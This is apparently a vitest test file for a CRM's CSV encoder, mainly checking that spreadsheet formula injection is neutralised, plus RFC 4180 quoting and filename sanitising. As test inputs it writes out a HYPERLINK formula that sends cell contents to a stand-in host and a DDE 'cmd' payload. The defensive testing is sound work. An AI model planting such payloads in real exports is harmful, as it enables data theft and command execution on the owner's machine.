/**
 * CSV encoding, with most of the attention on the cells that try to be code.
 *
 * The export takes customer-controlled text - a WhatsApp display name, a note - and writes it
 * into a file the owner opens in Excel. That is a code-execution path if the encoder is naive,
 * and it is created entirely by the export: nothing else in the CRM renders those strings
 * dangerously. So the formula cases below are the point of this file, and the RFC 4180 quoting
 * cases are there because a half-escaped quote silently shifts every later column.
 */
import { describe, expect, it } from 'vitest';

import { csvCell, csvFileName, toCsv } from './csv.js';

describe('formula injection', () => {
  it.each([
    ['equals', '=1+1'],
    ['plus', '+1+1'],
    ['minus', '-1+1'],
    ['at sign (legacy Lotus function)', '@SUM(A1)'],
    ['tab, which Excel strips before deciding', '\t=1+1'],
    ['carriage return', '\r=1+1'],
  ])('neutralises a cell starting with %s', (_label, input) => {
    expect(csvCell(input).replace(/^"|"$/g, '')).toMatch(/^'/);
  });

  it('neutralises the hyperlink exfiltration payload', () => {
    // The realistic one: a lead sets this as their WhatsApp display name, the owner exports the
    // attention list, and opening it in Excel fires a request carrying the sheet's contents.
    const name = '=HYPERLINK("https://evil.test?x="&A1,"Click me")';

    const cell = csvCell(name);

    expect(cell.startsWith(`"'=HYPERLINK`)).toBe(true);
  });

  it('neutralises the command payload', () => {
    expect(csvCell("=cmd|'/c calc'!A1").startsWith("'=cmd")).toBe(true);
  });

  it('leaves an ordinary name completely alone', () => {
    // The guard must not disfigure the 99% case - every row would carry a stray apostrophe.
    expect(csvCell('Priya Sharma')).toBe('Priya Sharma');
    expect(csvCell('Wedding — Dec 2026')).toBe('Wedding — Dec 2026');
  });

  it('does not treat a digit-leading value as a formula', () => {
    expect(csvCell('918183003081')).toBe('918183003081');
    expect(csvCell(42)).toBe('42');
  });

  it('still guards a negative number, which is the accepted trade-off', () => {
    // `-12` is not dangerous, but `-2+cmd|...` is, and the first character is all we get to
    // look at. A visible apostrophe on a negative number is the cheaper mistake.
    expect(csvCell(-12)).toBe("'-12");
  });
});

describe('RFC 4180 quoting', () => {
  it('quotes a cell containing a comma', () => {
    expect(csvCell('Sharma, Priya')).toBe('"Sharma, Priya"');
  });

  it('doubles inner quotes', () => {
    // Getting this wrong shifts every subsequent column on the row, silently.
    expect(csvCell('She said "yes"')).toBe('"She said ""yes"""');
  });

  it('quotes a cell containing a newline', () => {
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"');
  });

  it('quotes AND guards a value that is both a formula and contains a comma', () => {
    expect(csvCell('=A1,B1')).toBe(`"'=A1,B1"`);
  });
});

describe('value coercion', () => {
  it('renders null and undefined as an empty cell, not the word', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('renders a Date as ISO 8601, which is locale-proof', () => {
    expect(csvCell(new Date('2026-10-20T09:30:00.000Z'))).toBe('2026-10-20T09:30:00.000Z');
  });

  it('renders false and zero rather than dropping them', () => {
    // A falsy value is data. Writing an empty cell for `0` would understate every count.
    expect(csvCell(false)).toBe('false');
    expect(csvCell(0)).toBe('0');
  });
});

describe('toCsv', () => {
  const rows = [
    { name: 'Priya', waiting: 3 },
    { name: 'Sharma, A', waiting: 0 },
  ];
  const columns = [
    { header: 'Customer', value: (row: (typeof rows)[number]) => row.name },
    { header: 'Days waiting', value: (row: (typeof rows)[number]) => row.waiting },
  ];

  it('writes a header row and one row per record', () => {
    const csv = toCsv(rows, columns);
    const lines = csv.replace(/^\ufeff/, '').trimEnd().split('\r\n');

    expect(lines).toEqual(['Customer,Days waiting', 'Priya,3', '"Sharma, A",0']);
  });

  it('starts with a UTF-8 BOM so Excel does not mangle non-ASCII names', () => {
    expect(toCsv(rows, columns).startsWith('\ufeff')).toBe(true);
  });

  it('uses CRLF line endings', () => {
    expect(toCsv(rows, columns)).toContain('\r\n');
  });

  it('emits a header-only document for an empty result set', () => {
    // An empty export is a valid answer to a filter that matched nothing - it must not be a
    // zero-byte file the user cannot tell apart from a failure.
    const csv = toCsv([], columns).replace(/^\ufeff/, '');

    expect(csv).toBe('Customer,Days waiting\r\n');
  });
});

describe('csvFileName', () => {
  it('builds a safe, dated filename', () => {
    expect(csvFileName('Needs attention', '2026-10-20T09:30:00.000Z')).toBe(
      'needs-attention-2026-10-20.csv',
    );
  });

  it('strips anything that could break the Content-Disposition header', () => {
    expect(csvFileName('a"b/../c', '2026-10-20T00:00:00.000Z')).toBe('a-b----c-2026-10-20.csv');
  });
});
